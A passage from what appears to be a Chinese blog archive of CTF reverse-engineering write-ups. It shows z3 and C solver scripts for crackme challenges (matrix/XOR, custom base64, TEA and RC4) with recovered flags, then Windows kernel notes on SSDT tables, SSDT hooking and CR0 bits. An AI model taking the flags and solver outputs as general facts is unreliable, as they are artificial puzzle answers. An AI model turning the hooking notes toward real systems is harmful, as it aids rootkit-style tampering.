str(a2[i]) a2[i] = 0 else: flag = [ord(i) for i in iiIII] result = [ 7 * flag[0] == 504, 9 * flag[0] - 5 * flag[1] == 403, 2 * flag[0] - 5 * flag[1] + 10 * flag[2] == 799, 3 * flag[0] + 8 * flag[1] + 15 * flag[2] + 20 * flag[3] == 2938, 5 * flag[0] + 15 * flag[1] + 20 * flag[2] - 19 * flag[3] + 1 * flag[4] == 2042, 7 * flag[0] + 1 * flag[1] + 9 * flag[2] - 11 * flag[3] + 2 * flag[4] + 5 * flag[5] == 1225, 11 * flag[0] + 22 * flag[1] + 33 * flag[2] + 44 * flag[3] + 55 * flag[4] + 66 * flag[5] - 77 * flag[6] == 7975, 21 * flag[0] + 23 * flag[1] + 3 * flag[2] + 24 * flag[3] - 55 * flag[4] + 6 * flag[5] - 7 * flag[6] + 15 * flag[7] == 229, 2 * flag[0] + 26 * flag[1] + 13 * flag[2] + 0 * flag[3] - 65 * flag[4] + 15 * flag[5] + 29 * flag[6] + 1 * flag[7] + 20 * flag[8] == 2107, 10 * flag[0] + 7 * flag[1] + -9 * flag[2] + 6 * flag[3] + 7 * flag[4] + 1 * flag[5] + 22 * flag[6] + 21 * flag[7] - 22 * flag[8] + 30 * flag[9] == 4037, 15 * flag[0] + 59 * flag[1] + 56 * flag[2] + 66 * flag[3] + 7 * flag[4] + 1 * flag[5] - 122 * flag[6] + 21 * flag[7] + 32 * flag[8] + 3 * flag[9] - 10 * flag[10] == 4950, 13 * flag[0] + 66 * flag[1] + 29 * flag[2] + 39 * flag[3] - 33 * flag[4] + 13 * flag[5] - 2 * flag[6] + 42 * flag[7] + 62 * flag[8] + 1 * flag[9] - 10 * flag[10] + 11 * flag[11] == 12544, 23 * flag[0] + 6 * flag[1] + 29 * flag[2] + 3 * flag[3] - 3 * flag[4] + 63 * flag[5] - 25 * flag[6] + 2 * flag[7] + 32 * flag[8] + 1 * flag[9] - 10 * flag[10] + 11 * flag[11] - 12 * flag[12] == 6585, 223 * flag[0] + 6 * flag[1] - 29 * flag[2] - 53 * flag[3] - 3 * flag[4] + 3 * flag[5] - 65 * flag[6] + 0 * flag[7] + 36 * flag[8] + 1 * flag[9] - 15 * flag[10] + 16 * flag[11] - 18 * flag[12] + 13 * flag[13] == 6893, 29 * flag[0] + 13 * flag[1] - 9 * flag[2] - 93 * flag[3] + 33 * flag[4] + 6 * flag[5] + 65 * flag[6] + 1 * flag[7] - 36 * flag[8] + 0 * flag[9] - 16 * flag[10] + 96 * flag[11] - 68 * flag[12] + 33 * flag[13] - 14 * flag[14] == 1883, 69 * flag[0] + 77 * flag[1] - 93 * flag[2] - 12 * flag[3] + 0 * flag[4] + 0 * flag[5] + 1 * flag[6] + 16 * flag[7] + 36 * flag[8] + 6 * flag[9] + 19 * flag[10] + 66 * flag[11] - 8 * flag[12] + 38 * flag[13] - 16 * flag[14] + 15 * flag[15] == 8257, 23 * flag[0] + 2 * flag[1] - 3 * flag[2] - 11 * flag[3] + 12 * flag[4] + 24 * flag[5] + 1 * flag[6] + 6 * flag[7] + 14 * flag[8] - 0 * flag[9] + 1 * flag[10] + 68 * flag[11] - 18 * flag[12] + 68 * flag[13] - 26 * flag[14] + 15 * flag[15] - 16 * flag[16] == 5847, 24 * flag[0] + 0 * flag[1] - 1 * flag[2] - 15 * flag[3] + 13 * flag[4] + 4 * flag[5] + 16 * flag[6] + 67 * flag[7] + 146 * flag[8] - 50 * flag[9] + 16 * flag[10] + 6 * flag[11] - 1 * flag[12] + 69 * flag[13] - 27 * flag[14] + 45 * flag[15] - 6 * flag[16] + 17 * flag[17] == 18257, 25 * flag[0] + 26 * flag[1] - 89 * flag[2] + 16 * flag[3] + 19 * flag[4] + 44 * flag[5] + 36 * flag[6] + 66 * flag[7] - 150 * flag[8] - 250 * flag[9] + 166 * flag[10] + 126 * flag[11] - 11 * flag[12] + 690 * flag[13] - 207 * flag[14] + 46 * flag[15] + 6 * flag[16] + 7 * flag[17] - 18 * flag[18] == 12591, 5 * flag[0] + 26 * flag[1] + 8 * flag[2] + 160 * flag[3] + 9 * flag[4] - 4 * flag[5] + 36 * flag[6] + 6 * flag[7] - 15 * flag[8] - 20 * flag[9] + 66 * flag[10] + 16 * flag[11] - 1 * flag[12] + 690 * flag[13] - 20 * flag[14] + 46 * flag[15] + 6 * flag[16] + 7 * flag[17] - 18 * flag[18] + 19 * flag[19] == 52041, 29 * flag[0] - 26 * flag[1] + 0 * flag[2] + 60 * flag[3] + 90 * flag[4] - 4 * flag[5] + 6 * flag[6] + 6 * flag[7] - 16 * flag[8] - 21 * flag[9] + 69 * flag[10] + 6 * flag[11] - 12 * flag[12] + 69 * flag[13] - 20 * flag[14] - 46 * flag[15] + 65 * flag[16] + 0 * flag[17] - 1 * flag[18] + 39 * flag[19] - 20 * flag[20] == 20253, 45 * flag[0] - 56 * flag[1] + 10 * flag[2] + 650 * flag[3] - 900 * flag[4] + 44 * flag[5] + 66 * flag[6] - 6 * flag[7] - 6 * flag[8] - 21 * flag[9] + 9 * flag[10] - 6 * flag[11] - 12 * flag[12] + 69 * flag[13] - 2 * flag[14] - 406 * flag[15] + 651 * flag[16] + 2 * flag[17] - 10 * flag[18] + 69 * flag[19] - 0 * flag[20] + 21 * flag[21] == 18768, 555 * flag[0] - 6666 * flag[1] + 70 * flag[2] + 510 * flag[3] - 90 * flag[4] + 499 * flag[5] + 66 * flag[6] - 66 * flag[7] - 610 * flag[8] - 221 * flag[9] + 9 * flag[10] - 23 * flag[11] - 102 * flag[12] + 6 * flag[13] + 2050 * flag[14] - 406 * flag[15] + 665 * flag[16] + 333 * flag[17] + 100 * flag[18] + 609 * flag[19] + 777 * flag[20] + 201 * flag[21] - 22 * flag[22] == 111844, 1 * flag[0] - 22 * flag[1] + 333 * flag[2] + 4444 * flag[3] - 5555 * flag[4] + 6666 * flag[5] - 666 * flag[6] + 676 * flag[7] - 660 * flag[8] - 22 * flag[9] + 9 * flag[10] - 73 * flag[11] - 107 * flag[12] + 6 * flag[13] + 250 * flag[14] - 6 * flag[15] + 65 * flag[16] + 39 * flag[17] + 10 * flag[18] + 69 * flag[19] + 777 * flag[20] + 201 * flag[21] - 2 * flag[22] + 23 * flag[23] == 159029, 520 * flag[0] - 222 * flag[1] + 333 * flag[2] + 4 * flag[3] - 56655 * flag[4] + 6666 * flag[5] + 666 * flag[6] + 66 * flag[7] - 60 * flag[8] - 220 * flag[9] + 99 * flag[10] + 73 * flag[11] + 1007 * flag[12] + 7777 * flag[13] + 2500 * flag[14] + 6666 * flag[15] + 605 * flag[16] + 390 * flag[17] + 100 * flag[18] + 609 * flag[19] + 99999 * flag[20] + 210 * flag[21] + 232 * flag[22] + 23 * flag[23] - 24 * flag[24] == 2762025, 1323 * flag[0] - 22 * flag[1] + 333 * flag[2] + 4 * flag[3] - 55 * flag[4] + 666 * flag[5] + 666 * flag[6] + 66 * flag[7] - 660 * flag[8] - 220 * flag[9] + 99 * flag[10] + 3 * flag[11] + 100 * flag[12] + 777 * flag[13] + 2500 * flag[14] + 6666 * flag[15] + 605 * flag[16] + 390 * flag[17] + 100 * flag[18] + 609 * flag[19] + 9999 * flag[20] + 210 * flag[21] + 232 * flag[22] + 23 * flag[23] - 24 * flag[24] + 25 * flag[25] == 1551621, 777 * flag[0] - 22 * flag[1] + 6969 * flag[2] + 4 * flag[3] - 55 * flag[4] + 666 * flag[5] - 6 * flag[6] + 96 * flag[7] - 60 * flag[8] - 220 * flag[9] + 99 * flag[10] + 3 * flag[11] + 100 * flag[12] + 777 * flag[13] + 250 * flag[14] + 666 * flag[15] + 65 * flag[16] + 90 * flag[17] + 100 * flag[18] + 609 * flag[19] + 999 * flag[20] + 21 * flag[21] + 232 * flag[22] + 23 * flag[23] - 24 * flag[24] + 25 * flag[25] - 26 * flag[26] == 948348, 97 * flag[0] - 22 * flag[1] + 6969 * flag[2] + 4 * flag[3] - 56 * flag[4] + 96 * flag[5] - 6 * flag[6] + 96 * flag[7] - 60 * flag[8] - 20 * flag[9] + 99 * flag[10] + 3 * flag[11] + 10 * flag[12] + 707 * flag[13] + 250 * flag[14] + 666 * flag[15] + -9 * flag[16] + 90 * flag[17] + -2 * flag[18] + 609 * flag[19] + 0 * flag[20] + 21 * flag[21] + 2 * flag[22] + 23 * flag[23] - 24 * flag[24] + 25 * flag[25] - 26 * flag[26] + 27 * flag[27] == 777044, 177 * flag[0] - 22 * flag[1] + 699 * flag[2] + 64 * flag[3] - 56 * flag[4] - 96 * flag[5] - 66 * flag[6] + 96 * flag[7] - 60 * flag[8] - 20 * flag[9] + 99 * flag[10] + 3 * flag[11] + 10 * flag[12] + 707 * flag[13] + 250 * flag[14] + 666 * flag[15] + -9 * flag[16] + 0 * flag[17] + -2 * flag[18] + 69 * flag[19] + 0 * flag[20] + 21 * flag[21] + 222 * flag[22] + 23 * flag[23] - 224 * flag[24] + 25 * flag[25] - 26 * flag[26] + 27 * flag[27] - 28 * flag[28] == 185016, 77 * flag[0] - 2 * flag[1] + 6 * flag[2] + 6 * flag[3] - 96 * flag[4] - 9 * flag[5] - 6 * flag[6] + 96 * flag[7] - 0 * flag[8] - 20 * flag[9] + 99 * flag[10] + 3 * flag[11] + 10 * flag[12] + 707 * flag[13] + 250 * flag[14] + 666 * flag[15] + -9 * flag[16] + 0 * flag[17] + -2 * flag[18] + 9 * flag[19] + 0 * flag[20] + 21 * flag[21] + 222 * flag[22] + 23 * flag[23] - 224 * flag[24] + 26 * flag[25] - -58 * flag[26] + 27 * flag[27] - 2 * flag[28] + 29 * flag[29] == 130106] if all(result): print(&quot;Congratulation!!!&quot;) else: print(&quot;wrong_wrong!!!&quot;)# okay decompiling output.pyc z3约束一下，获得 H1Z1N1U1C1T1F1{1a6d275f7-463}1 前面还有111111116257645365477364777645752361 代表着出现的次数，其实z3获得的两个两个一组，第一个是字符，第二个是出现次数，然后往里面填flag就好a6 d2 75 f7 -4 63 得到HZNUCTF{adffa-f6af-ff6a-fffa-fffd6a} randomsystem先静态分析 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071int __cdecl main(int argc, const char **argv, const char **envp)&#123;//初始化省略... sub_E3137A(&amp;unk_E3E0A9); p_n53 = 0; n53_1 = 0; n53_2 = 0; n53_3 = 0; v30 = 0; j_memset(box, 0, 0x100u); j_memset(&amp;v21, 0, 0x100u); strcpy(KeYkEy__, &quot;KeYkEy!!&quot;);//flag初始化省略... sub_E310EB(&quot;Welcome to HZNUCTF!!!\\n&quot;, v7); sub_E310EB(&quot;Enter something: \\n&quot;, v8); scanf(&quot;%64s&quot;, v32); sub_E31339(v32, v31); sub_E3128F(v31[0], v31[1], &amp;p_n53); if ( //对第一次输入验证 ) &#123; sub_E310EB(&quot;good_job!!!\\n&quot;, v9); sub_E310EB(&quot;So, Plz input the flag:\\n&quot;, v10); scanf(&quot;%73s&quot;, &amp;v24); strncpy_s(Destination, 65u, Source, 64u); sub_E3127B(); srand(Seed); sub_E3127B(); j_memset(num, 0, 0x80u); for ( i = 0; i &lt; 32; ++i ) &#123; do &#123; rand(); v4 = sub_E3127B() % 32; v16 = 1; for ( j = 0; j &lt; i; ++j ) &#123; if ( num[j] == v4 ) &#123; v16 = 0; break; &#125; &#125; &#125; while ( !v16 ); num[i] = v4; &#125; j_a2z(Destination, num); j_make(box, Destination); j_makekey(&amp;p_n53, KeYkEy__); j_encrypt(box1, box, &amp;v21); v14 = 0; for ( k = 0; k &lt; 8; ++k ) &#123; for ( m = 0; m &lt; 8; ++m ) &#123; box[32 * k + m + 64] ^= KeYkEy__[v14 % j_strlen(KeYkEy__)]; ++v14; &#125; &#125; if ( j_strcmp(&amp;v21, flag) == 1 ) sub_E310EB(&quot;Congratulation!!!\\n&quot;, v11); &#125; else &#123; sub_E310EB(&quot;wrong_wrong!!!\\n&quot;, v9); &#125; sub_E3120D(&amp;savedregs, &amp;dword_E32D48, 0, v3); return v6;&#125; sub_E3127B函数是函数指针的调用，调用者就是上面的函数 那么大致流程就是先输入然后验证，在输入明文，明文被随机数打乱，然后生成8*8的矩阵，紧接着用第一次输入构造key，然后用box1和输入矩阵生成新的矩阵，然后矩阵异或key，最后验证 所以直接z3求解，大部分的可以dump下来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#flag = 0x12a,0x101,0xff,0x190,0x147,0x12c,0xd8,0x133,0x17c,0x13f,0xc7,0x154,0x118,0x101,0x13e,0x160,0x162,0x167,0xf0,0x181,0x160,0x128,0x108,0x136,0xc5,0xa7,0xaf,0x10a,0xfb,0xac,0xe5,0xfd,0xfb,0xfe,0xfd,0x17b,0xcc,0x141,0xd4,0x108,0x97,0x71,0x96,0xc4,0xc6,0x58,0xaa,0xa2,0xaf,0x5c,0xa9,0xe3,0xa4,0xff,0x71,0x62,0xc8,0xd0,0xc3,0x104,0xca,0x100,0xf6,0xc5,flag=[0x00000178, 0x00000164, 0x000000A9, 0x000001F5, 0x00000115, 0x00000149, 0x0000008B, 0x00000156, 0x0000017C, 0x0000016D, 0x000000A2, 0x00000102, 0x0000017D, 0x00000153, 0x0000015B, 0x00000133, 0x00000107, 0x00000167, 0x000000A2, 0x000001E4, 0x00000136, 0x0000014D, 0x0000015A, 0x00000153, 0x00000096, 0x000000C2, 0x000000AF, 0x00000158, 0x0000009E, 0x000000FA, 0x00000080, 0x000000AF, 0x0000009E, 0x000000AD, 0x00000098, 0x0000017B, 0x0000009E, 0x00000124, 0x00000082, 0x0000016D, 0x000000C5, 0x00000014, 0x000000C5, 0x000000A1, 0x000000C6, 0x0000000A, 0x000000CF, 0x000000F4, 0x000000CA, 0x0000000E, 0x000000CC, 0x000000B0, 0x000000C1, 0x000000FF, 0x00000023, 0x00000007, 0x0000009E, 0x000000B5, 0x00000091, 0x00000161, 0x00000099, 0x00000165, 0x000000F6, 0x00000097]#flag=[0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000184, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x000000C2, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123, 0x00000123]#flag=[0x000001D6, 0x000001E1, 0x000001D2, 0x000001E1, 0x000001D6, 0x000001E1, 0x000001D7, 0x000001E1, 0x000001D6, 0x000001E1, 0x000001D2, 0x000001E1, 0x000001D6, 0x000001E1, 0x000001D7, 0x000001E1, 0x000001D6, 0x000001E1, 0x000001D2, 0x000001E1, 0x000001D6, 0x000001E1, 0x000001D7, 0x000001E1, 0x00000171, 0x00000146, 0x00000175, 0x00000146, 0x00000171, 0x00000146, 0x00000170, 0x00000146, 0x00000171, 0x00000146, 0x00000175, 0x00000146, 0x00000171, 0x00000146, 0x00000170, 0x00000146, 0x00000090, 0x000000A7, 0x00000094, 0x000000A7, 0x00000090, 0x000000A7, 0x00000091, 0x000000A7, 0x00000090, 0x000000A7, 0x00000094, 0x000000A7, 0x00000090, 0x000000A7, 0x00000091, 0x000000A7, 0x00000171, 0x00000146, 0x00000175, 0x00000146, 0x00000171, 0x00000146, 0x00000170, 0x00000146]xor = [82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,82,101,86,101,82,101,83,101,]outputbox_pre_xor = [flag[i] ^ xor[i] for i in range(64)]from z3 import *data = [ [1,1,0,1,0,0,1,0], [0,1,1,0,0,1,0,1], [0,0,1,1,0,1,1,0], [0,0,0,1,0,1,0,1], [0,1,0,0,1,0,1,0], [0,0,0,0,0,1,0,1], [0,0,0,0,0,0,1,1], [0,1,1,0,0,0,0,1]]solver = Solver()inputbox = [[Int(f&quot;inputbox_&#123;i&#125;_&#123;j&#125;&quot;) for j in range(8)] for i in range(8)]for i in range(8): for j in range(8): solver.add(inputbox[i][j] &gt;= 0, inputbox[i][j] &lt;= 255)for i in range(8): for j in range(8): total = sum(data[i][k] * inputbox[k][j] for k in range(8)) solver.add(total == outputbox_pre_xor[i*8 + j])if solver.check() == sat: model = solver.model() inputbox_values = [[model.eval(inputbox[i][j]).as_long() for j in range(8)] for i in range(8)] print(inputbox_values)else: print(&quot;No solution found.&quot;)processed_input = [inputbox_values[i][j] for i in range(8) for j in range(8)]randnum = [ 27, 26, 25, 23, 28, 1, 6, 10, 20, 7, 15, 14, 31, 18, 19, 21, 9, 30, 22, 24, 8, 2, 29, 3, 12, 11, 17, 16, 0, 13, 5, 4]v4 = len(processed_input)for i in range(v4 &gt;&gt; 1): pos = v4 - randnum[i] - 1 processed_input[i], processed_input[pos] = processed_input[pos], processed_input[i]original_input = bytes(processed_input)print(original_input.decode()) 得到3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58","updated":"2025-10-08T10:00:22.117Z","categories":[{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"}]},{"title":"轩辕杯2025-re-wp","date":"2025-05-25T12:42:14.000Z","path":"2025/05/25/2025轩辕杯/","text":"二等奖 Matlab_SMC？首先运行给的MyAppInstaller_web，获取MATLAB Runtime环境 先运行一边程序，发现多得到了一个log文件，log文件内容是 输入文件 “flag.xlsx” 不存在！ 观察到有enc文件我将enc文件改名位flag.xlsx 得到这个，猜想flag-&gt;enc的加密关系，尝试将flag里面的数据换成简单的 enc的值换成上面的得到 1.0205 1.042 1.0645 1.088 1.25 1.6 2.05 2.6 8 25 52 89 8 得到关系时 5xx+2*x+1&#x3D;y 所以写exp获取所有的值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;stdio.h&gt;#include &lt;math.h&gt;double inverse(double y) &#123; if (5 * y - 4.0 &lt; 0) &#123; return NAN; &#125; return (-1.0 + sqrt(5.0 * y - 4.0)) / 5.0;&#125;int main(void) &#123; // 两列数据，各有 33 个元素 double col1[33] = &#123; 24.890125, 1084.192, 89.210125, 876.626125, 157.6, 9833.195125, 66.866125, 83.6245, 939.25, 778.3045, 589.4125, 72.431125, 212.05, 261.442, 968.2405, 578.075125, 157.6, 205.280125, 516.928, 987.110125, 2248, 182.002, 246.5005, 299.5645, 65.2405, 591.041125, 529.192, 71.8645, 87.328, 1230.112, 257.128, 125.051125, 504.808 &#125;; double col2[33] = &#123; 214.0045, 6.9605, 454.9045, 26.338, 101.152, 88.162, 236.7845, 1423.7845, 190.528, 14.7445, 229.9645, 685.25, 196.738, 192.3805, 10.882, 63.1045, 538.4845, 647.1845, 1003.328, 724.4045, 102.05, 451.1005, 2284.1845, 132.3845, 685.25, 8.0, 23.9125, 5079.2845, 2178.5845, 67.4125, 33.058, 921.5245, 555.2045 &#125;; int n = 33; for (int i = 0; i &lt; n; i++) &#123; double y = col1[i]; double x = inverse(y); if (isnan(x)) &#123; printf(&quot;对于 y = %.6f，不存在实数解 x\\n&quot;, y); &#125; else &#123; printf(&quot;%.6f\\n&quot;, x); &#125; &#125; printf(&quot;---------------------------------------------------------------\\n&quot;); for (int i = 0; i &lt; n; i++) &#123; double y = col2[i]; double x = inverse(y); if (isnan(x)) &#123; printf(&quot;对于 y = %.6f，不存在实数解 x\\n&quot;, y); &#125; else &#123; printf(&quot;%.6f\\n&quot;, x); &#125; &#125; return 0;&#125; 得到 1.995 6.33 14.52 0.91 4.005 9.33 13.035 2.06 5.4 4.28 44.145 3.98 3.435 6.67 3.87 16.67 13.5 5.96 12.27 1.47 10.65 6.57 3.585 11.5 6.3 6.06 7.02 5.99 13.71 1.22 10.545 3.33 5.4 10.17 6.195 11.17 9.96 13.96 13.845 11.83 21 4.3 5.82 9.29 6.81 21.17 7.53 4.93 3.39 11.5 10.665 1 10.08 1.95 3.57 31.67 3.96 20.67 15.48 3.45 6.96 2.34 4.785 13.37 9.84 10.33 计算平均值得到 8.346 9.493 计算md5得到 包裹flag得到flag{4291e94d849f009d7b60dd89a12dcfba} ezBase upx壳，手脱 找到入口点进去然后就是从start找到main 找到主函数，逻辑很简单，输入在v5，v5进加密到v4，密文是iP}ui7siC&#96;otMgAh5o]Tg&lt;4jPmtIvM5CI4h644K7M~KVg&#x3D; 加密在base64基础上加了个异或 base64换表AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789+&#x2F; 得到flag{Y0u_@R3_Upx_4nd_b45364_m4st3r!} 你知道base么 第一段对输入key tea加密，解密得到y0uokTea key是y0uokTea，然后对base表进行rc4，rc4的key就是y0uokTea，rc4变种 最后是加，写解密得到gVxwoFhPyT&#x2F;YM0BKcHe4b8GCUZtlnLW2SJO51IErk+q6vzpamdARX9siND3uQfj7 最后是base系列的，表如上，得到的密文是0tCPwtnncFZyYUlSK&#x2F;4Cw0&#x2F;echcG2lteBWnG2Ulw0htCYTMW 没看出来是base几，直接写解密 ，最后exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;void erc4(unsigned char* key, int key_Len, unsigned char* data, int data_Len) //加解密&#123; int i = 0, j = 0, t = 0; unsigned char s[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i &lt; 256; i++) &#123; s[i] = i; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + key[i % key_Len]) % 256; tmp = s[i]; s[i] = s[j]; //交换s[i]和s[j] s[j] = tmp; &#125; int q = 0; i = j = 0; for (q = 0; q &lt; data_Len; q++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; //交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; data[q] -= s[t]; &#125;&#125;void detea(unsigned int* a1, uint32_t* a2)&#123; unsigned int v2; // [rsp+24h] [rbp+4h] unsigned int v3; // [rsp+44h] [rbp+24h] int v4; // [rsp+64h] [rbp+44h] unsigned int i; // [rsp+84h] [rbp+64h] v2 = *a1; v3 = a1[1]; v4 = 0; for (int i = 0; i &lt; 0x20; i++) &#123; v4-= 1640531527; &#125; for (i = 0; i &lt; 0x20; ++i) &#123; v3 -= (a2[3] + (v2 &gt;&gt; 5)) ^ (v4 + v2) ^ (a2[2] + 16 * v2); v2 -= (a2[1] + (v3 &gt;&gt; 5)) ^ (v4 + v3) ^ (*a2 + 16 * v3); v4 += 1640531527; &#125; *a1 = v2; a1[1] = v3;&#125;uint8_t str[40];uint8_t cn1 = 0;void printfbin(uint8_t* a1)&#123; for (uint8_t j = 0; j &lt; 7; j++) &#123; for (int i = 4; i &gt;= 0; i--) &#123; str[cn1++] = (a1[j] &gt;&gt; i) &amp; 0x1; &#125; &#125; return;&#125;void debase(char* input, int len, char* table)&#123; char* out; uint32_t i, v3, v5, cn, on, v10; uint64_t v11 = 0; out = malloc(100); cn = 0; on = 0; uint8_t untable[256] = &#123; 0 &#125;; for (i = 0; i &lt; 64; i++) &#123; untable[table[i]] = i; &#125; uint8_t a[7]; for (int i = 0; i &lt; 7; i++) &#123; a[0] = ((untable[input[cn++]] - 1)); a[1] = ((untable[input[cn++]] - 1)); a[2] = ((untable[input[cn++]] - 1)); a[3] = ((untable[input[cn++]] - 1)); a[4] = ((untable[input[cn++]] - 1)); a[5] = ((untable[input[cn++]] - 1)); a[6] = ((untable[input[cn++]] - 1)); printfbin(a); &#125; //for (uint8_t i = 0; i &lt; cn1 -1; i++) //&#123; // printf(&quot;%d&quot;, str[i]); //&#125; //printf(&quot;\\n&quot;); uint8_t outstr = 0; uint8_t k = 0; for (uint8_t i = 0; i &lt; cn1/8; i++) &#123; outstr = 0; for (int j = 7; j &gt;= 0; j--) &#123; //printf(&quot;%d&quot;, str[k]); outstr |= str[k++] &lt;&lt; j; &#125; printf(&quot;%c&quot;, outstr); &#125; printf(&quot;\\n&quot;); &#125;int main()&#123; uint32_t v8[4]; v8[0] = 0x12345678; v8[1] = 0x3456789A; v8[2] = 0x89ABCDEF; v8[3] = 0x12345678; uint32_t v7[2]; v7[0] = 0xA92F3865; v7[1] = 0x9E60E953; detea(v7, v8); uint8_t a[9]; for (int k = 0; k &lt; 2; k++) &#123; a[k * 4] = (v7[k]); a[k * 4 + 1] = (v7[k] &gt;&gt; 8); a[k * 4 + 2] = (v7[k] &gt;&gt; 16); a[k * 4 + 3] = (v7[k] &gt;&gt; 24); &#125; a[8] = 0; printf(&quot;%s\\n&quot;, a); //y0uokTea uint8_t rc4table[65] = &#123; 0xD4, 0x59, 0x23, 0x76, 0xB4, 0xBF, 0xE3, 0x2C, 0x58, 0x8F, 0x56, 0x19, 0xDA, 0xF0, 0xC0, 0xBD, 0x36, 0x3D, 0x7B, 0x46, 0x1B, 0xB8, 0x17, 0x1F, 0xE3, 0xD0, 0x03, 0x45, 0xCD, 0x04, 0xED, 0xC9, 0x67, 0xE6, 0xAB, 0x29, 0xA7, 0xBC, 0x0B, 0xDE, 0x5C, 0x30, 0x71, 0xD7, 0xD5, 0x5A, 0xC6, 0x9F, 0x40, 0x65, 0xC4, 0x71, 0xA9, 0xC3, 0xAE, 0xD9, 0xB5, 0xE5, 0x12, 0x8C, 0x80, 0x52, 0x34, 0x36, 0 &#125;; erc4(a, 8, rc4table, 64); printf(&quot;%s\\n&quot;, rc4table); //gVxwoFhPyT/YM0BKcHe4b8GCUZtlnLW2SJO51IErk+q6vzpamdARX9siND3uQfj7 uint8_t flag[] = &quot;0tCPwtnncFZyYUlSK/4Cw0/echcG2lteBWnG2Ulw0htCYTMW&quot;; debase(flag, 48, rc4table); //flag&#123;y0u__rea11y__k1ow__Base!&#125; return 0;&#125;","updated":"2025-10-08T09:39:30.413Z","categories":[{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"}]},{"title":"WindowsStudy03-进程线程","date":"2025-04-30T07:53:21.000Z","path":"2025/04/30/WindowsStudy03-进程线程/","text":"系统调用、进程、线程 系统调用 我只能说，windows真是等级森严啊 假如说我们要调用ControlDeviceIo这个API，那么会经过kernel32.dll-&gt;kernelbase.dll-&gt;ntdll.dll-&gt;ntoskrnl.exe-&gt;xxx-&gt;hal.dll 差不多就是层层审批，所以这也解释了为什么说有的函数出自kernel32.dll但是用ida看的时候却发现，里面的实现仅有一个call指令，原来是在向下蔓延 kernel32.dll.OpenProcess—&gt;kernelBase.dll.OpenProcess–&gt;ntdll.dll.ZwOpenProcess–&gt;0x7ffe0300–&gt;sysenter–&gt;内核 SSDT和ShadowSSDT表 ntdll.dll和user32.dll gdt32.dll访问内核时，用到的函数表 里面存储了四个元素 函数表 服务调用次数统计 函数个数 参数表 SSDT表中基本存储无通信的内核函数，另一个存的就是有通信的了（不全是 这涉及到一个东西，服务号，比如pwn中最常见的system就是0x2b，这就是服务号，参数表查询和函数表查询都是通过服务号偏移拿到的(举例仅供参考，这个是linux系统的服务号) 自己定义 123456789typedef struct __SSDTItem&#123; PULONG funcTable; ULONG count; ULONG funcMax; PUCHAR paremTable;&#125;SSDTItem,*PSSDTItemEXTERN_C PSSDTItem KeServiceDescriptorTable; syscall 嗯，这节课相当于分析了，sysentry实现细节，总结来说就是三个步骤 1.保存环境，搞新环境 2.复制参数 3.CALL 不过细细下来分析还是很复杂的，后面如果用到再说吧 这个里面分析好像就能跟着学很多比如 IRQL 代码等级，0 1 2，代码等级2号要大于1号大于0号，运行起来优先级也会高，比如说键盘和语雀，我输入一个'a'，语雀会立马出现，是因为键盘的等级高，它可以让语雀中断先执行键盘，然后回去执行语雀，大致是这个意思 syscall返回部分 返回部分还有有一个R3esp设置回去，这里作用主要在R0调用R0然后返回R3要返回栈环境的 SSDT_HOOK Cr0 MDL Cr0这个词我都差点忘了 是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。 0位是保护允许位PE(Protedted Enable)，用于启动保护模式，如果PE位置1，则保护模式启动，如果PE&#x3D;0，则在实模式下运行。 1 位是监控协处理位MP(Moniter coprocessor)，它与第3位一起决定：当TS&#x3D;1时操作码WAIT是否产生一个“协处理器不能使用”的出错信号。第3位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置1。随着TS&#x3D;1，就不能使用协处理器。 CR0的第2位是模拟协处理器位 EM (Emulate coprocessor)，如果EM&#x3D;1，则不能使用协处理器，如果EM&#x3D;0，则允许使用协处理器。 第4位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果ET&#x3D;0，则标识系统使用的是287协处理器，如果 ET&#x3D;1，则表示系统使用的是387浮点协处理器。 CR0的第31位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。 